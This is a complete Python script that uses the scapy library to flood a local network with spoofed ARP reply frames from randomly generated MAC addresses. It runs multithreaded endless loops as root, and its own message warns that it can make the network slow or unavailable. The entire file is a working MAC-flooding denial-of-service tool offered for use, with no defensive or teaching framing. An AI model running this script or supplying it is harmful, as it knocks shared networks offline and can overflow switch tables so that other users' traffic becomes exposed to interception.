#!/usr/bin/env python

import random
import sys
import threading
import os
sys.stderr = None 
from scapy.all import *
sys.stderr = sys.__stderr__

packetCount = 0

def get_cpu_cores():
    return os.cpu_count()

def check_root():
    if os.geteuid() != 0:
        print("Script must run as root")
        sys.exit(1)

def generateRandomMac():
    mac = ""
    for i in range (0, 6):
        digit = hex(random.randint(0,255))
        digit = digit[2:]
        if len(digit) == 1:
            digit = "0" + digit
        mac = mac + digit +":"
    return mac[:-1]


def sendPacket(sourceMac, destinationMac):
    global packetCount
    sendp(Ether(src=sourceMac,dst=destinationMac) /
          ARP(op=2, psrc="0.0.0.0", hwdst=destinationMac) /
          Padding(load="X"*18),verbose = False)
    packetCount = packetCount +1
    print("Packets: " + str(packetCount))

def floodMac():
    while True:
        sendPacket(generateRandomMac(),generateRandomMac())

def startThreads():
    global packetCount
    for i in range(1,threads):
        print(str(i))
        t = threading.Thread(target=floodMac)
        t.start()

if __name__ == "__main__":
    try:
        check_root()
        cpu_cores = get_cpu_cores()
        print("The script can make the network slow/unavailable")
        print("To stop press CTRL+C")
        threads = int(input(f"\nEnter number of Threads (1-{cpu_cores} or more): "))
        startThreads()
    except KeyboardInterrupt:
        print("\nScript stopped by user.")